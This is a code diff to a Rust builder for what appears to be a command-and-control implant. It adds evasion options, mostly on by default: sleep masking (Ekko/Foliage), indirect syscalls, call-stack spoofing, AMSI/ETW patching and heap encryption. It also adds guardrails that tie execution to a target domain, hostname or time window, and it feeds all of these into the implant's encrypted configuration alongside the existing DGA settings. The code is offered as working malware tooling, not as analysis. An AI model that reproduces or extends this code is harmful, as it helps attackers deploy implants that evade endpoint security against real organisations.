@@ -1,5 +1,5 @@
 // src/bin/builder.rs
-use clap::{Parser, ValueEnum};
+use clap::{ArgAction, Parser, ValueEnum};
 use std::process::Command;
 use std::fs;
 use std::path::PathBuf;
@@ -55,6 +55,26 @@ struct Cli {
     #[arg(long, default_value_t = 16)] dga_count: u32,
     /// Comma-separated TLD list for DGA (default "com,net,org").
     #[arg(long, default_value = "com,net,org")] dga_tlds: String,
+    // ── Evasion ───────────────────────────────────────────────────────
+    /// Sleep masking algorithm: "none" | "ekko" | "foliage".
+    #[arg(long, default_value = "ekko")]   sleep_mask:        String,
+    /// Use indirect syscall stubs instead of direct ntdll calls.
+    #[arg(long, action = ArgAction::Set, default_value_t = true)]   indirect_syscalls: bool,
+    /// Enable fiber-based call-stack spoofing before every sleep.
+    #[arg(long, action = ArgAction::Set, default_value_t = true)]   stack_spoof:       bool,
+    /// Patch AMSI and ETW on startup.
+    #[arg(long, action = ArgAction::Set, default_value_t = true)]   patch_amsi_etw:    bool,
+    /// Encrypt the heap with AES-256-GCM during sleep windows.
+    #[arg(long, action = ArgAction::Set, default_value_t = true)]   heap_encrypt:      bool,
+    // ── Execution guardrails ──────────────────────────────────────────
+    /// Glob pattern the AD domain must match (e.g. "CORP*"). Empty = disabled.
+    #[arg(long, default_value = "")]       guard_domain:      String,
+    /// Glob pattern the hostname must match (e.g. "DESKTOP-*"). Empty = disabled.
+    #[arg(long, default_value = "")]       guard_hostname:    String,
+    /// Active-hours window as "HH-HH", e.g. "8-18". Omit to disable.
+    #[arg(long)]                           guard_hours:       Option<String>,
+    /// Exit if the agent is running as SYSTEM / root.
+    #[arg(long, default_value_t = false)]  guard_no_system:   bool,
 }
 
 #[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
@@ -165,6 +185,27 @@ fn main() -> Result<()> {
     println!("[*] Port/Pipe:   {}", cli.port);
 
     if cli.jitter_min > 100 { anyhow::bail!("Jitter Min cannot exceed 100%."); }
+
+    // ── Parse guard_hours into start/end ──────────────────────────────
+    // The API passes this as "HH-HH" (e.g. "8-18"). Omitting it leaves
+    // both values at 0, which the agent treats as "no time-window check".
+    let (guard_hour_start, guard_hour_end): (u8, u8) = match &cli.guard_hours {
+        Some(gh) => {
+            let parts: Vec<&str> = gh.splitn(2, '-').collect();
+            if parts.len() != 2 {
+                anyhow::bail!(
+                    "guard_hours must be in HH-HH format (e.g. \"8-18\"), got: {}",
+                    gh
+                );
+            }
+            let start: u8 = parts[0].parse()
+                .with_context(|| format!("guard_hours start '{}' is not a valid hour (0–23)", parts[0]))?;
+            let end: u8 = parts[1].parse()
+                .with_context(|| format!("guard_hours end '{}' is not a valid hour (0–23)", parts[1]))?;
+            (start, end)
+        }
+        None => (0, 0),
+    };
 
     // ── Locate build tooling ──────────────────────────────────────────
     let cargo_bin = find_cargo();
@@ -306,7 +347,19 @@ fn main() -> Result<()> {
             "window_secs": cli.dga_window,
             "count":       cli.dga_count,
             "tlds":        cli.dga_tlds.split(',').collect::<Vec<_>>()
-        }))
+        })),
+        // ── Evasion ───────────────────────────────────────────────────
+        "sleep_mask":        cli.sleep_mask,
+        "indirect_syscalls": cli.indirect_syscalls,
+        "stack_spoof":       cli.stack_spoof,
+        "patch_amsi_etw":    cli.patch_amsi_etw,
+        "heap_encrypt":      cli.heap_encrypt,
+        // ── Execution guardrails ──────────────────────────────────────
+        "guard_domain":      cli.guard_domain,
+        "guard_hostname":    cli.guard_hostname,
+        "guard_hour_start":  guard_hour_start,
+        "guard_hour_end":    guard_hour_end,
+        "guard_no_system":   cli.guard_no_system,
     }).to_string();
 
     println!("[*] Encrypting configuration...");
